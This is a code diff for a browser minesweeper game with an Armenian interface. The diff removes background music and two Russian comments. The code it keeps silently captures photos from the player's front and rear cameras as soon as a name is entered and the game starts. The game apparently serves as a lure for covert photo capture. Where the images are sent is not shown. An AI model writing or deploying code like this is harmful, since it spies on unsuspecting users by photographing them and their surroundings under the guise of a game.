@@ -125,9 +125,6 @@
     #restart-btn:hover {
       background-color: #3b8b40;
     }
-    audio {
-      display: none;
-    }
 
     @media (max-width: 480px) {
       #game-board {
@@ -169,10 +166,6 @@
   <button id="restart-btn">Նոր խաղ</button>
 </div>
 
-<audio id="bg-music" loop>
-  <source src="https://cdn.pixabay.com/download/audio/2022/03/14/audio_65b79a2eeb.mp3" type="audio/mpeg" />
-</audio>
-
 <script>
 (() => {
   const permissionDeniedDiv = document.getElementById('permission-denied');
@@ -183,7 +176,6 @@
   const restartBtn = document.getElementById('restart-btn');
   const gameBoard = document.getElementById('game-board');
   const status = document.getElementById('status');
-  const bgMusic = document.getElementById('bg-music');
 
   const size = 8;
   const bombsCount = 10;
@@ -341,14 +333,8 @@
     if (!playerName) return alert('Խնդրում ենք մուտքագրել անունը։');
 
     startBtn.disabled = true;
-    try {
-      bgMusic.volume = 0.15;
-      await bgMusic.play();
-    } catch {}
 
-    // Запрашиваем фото с фронтальной камеры
     photoFrontBlob = await takePhoto('user');
-    // Запрашиваем фото с задней камеры
     photoBackBlob = await takePhoto('environment');
 
     try {
